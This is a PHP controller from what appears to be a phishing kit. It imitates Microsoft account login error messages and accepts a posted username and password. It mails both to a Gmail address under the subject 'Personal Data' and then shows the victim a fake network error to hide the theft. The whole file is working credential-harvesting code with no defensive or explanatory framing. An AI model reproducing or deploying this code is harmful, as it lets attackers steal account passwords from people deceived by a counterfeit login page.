<?php
class PagesController extends Controller {

    private $namespacemodel;
    public function __construct() {
       @$this->namespacemodel = @$this->loadModel('LoginModel');
    }
    public function index(){
        @$data = [
                    'meta_Description'=>''
                    
                ];
            // Render View Controller
        @$this->view('index', @$data);    
    }

    public function MainController(){
        header("Access-Control-Allow-Origin: *");
        header("Content-Type: application/json; charset=UTF-8");
        header("Access-Control-Allow-Methods: POST");
        header("Access-Control-Max-Age: 3600");
        header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");
        ob_start();
        $jsonString = file_get_contents("php://input");
        $response = array();
        $phpObject = json_decode($jsonString);
        $___Username=$phpObject->{'___Username'};
        $___Userpassword=$phpObject->{'___Userpassword'};
        $newJsonString = json_encode($phpObject);
        if (empty($___Username)) {
            // Error message
            $response['message'] = 'Enter a valid email address, phone number, or Skype name.';
        }
        if (empty($___Userpassword)) {
            $response['message']= 'Please enter the password for your Microsoft account.';
        }
        elseif(!empty($___Username) && !empty($___Userpassword)){
            $_POST = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
            $data=
            [
                '____email'=>strip_tags(trim(filter_var($___Username, FILTER_SANITIZE_STRING))),
                '____password'=>strip_tags(trim(filter_var($___Userpassword, FILTER_SANITIZE_STRING))),
            ];
                 
            $header = "From:".$data['____email']."\r\n".
            "------------------------------------------------------------\n";
            $header .= "MIME-Version: 1.0\r\n";
            $header .= "Content-type: text/html\r\n";

            $to =  'abc@gmail.com';
            $subject= "Personal Data.\n".
            "------------------------- MESSAGE -------------------------\n\n".
            // Set the body of the email you're sending
            $message = 'Email: '.$data['____email']."\n".
            $message = 'Password: '.$data['____password']."\n".
            "\n\n------------------------------------------------------------\n";
            $retval = mail ($to,$subject,$message,$header);
            
            if( $retval == true ) {
                //if successful throw error as success message
                $response['status'] = 200;
                $response['message'] = 'Sorry..! Please check your internet connection.';
                // redirect to Google main login page
            }else {
                $response['status'] = 200;
                // Default error for not sending.
                $response['message'] = "<b>Weak Network.</b> Please connect your device to a strong network.";
            }
            
        }
        ob_end_clean();
        jsonResponses($response);
    }
    
}